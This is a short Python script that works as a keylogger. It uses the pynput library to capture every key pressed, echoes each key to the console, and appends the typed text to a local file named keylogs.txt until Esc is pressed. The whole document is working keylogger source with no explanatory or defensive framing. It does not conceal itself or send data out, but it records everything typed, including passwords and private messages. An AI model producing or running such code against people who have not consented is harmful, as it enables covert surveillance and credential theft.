import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

print("initiaing..")
def on_press(key):
    global count,keys

    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 15:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("keylogs.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("space") > 0:
                f.write(" ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release = on_release) as listener:
    listener.join()

    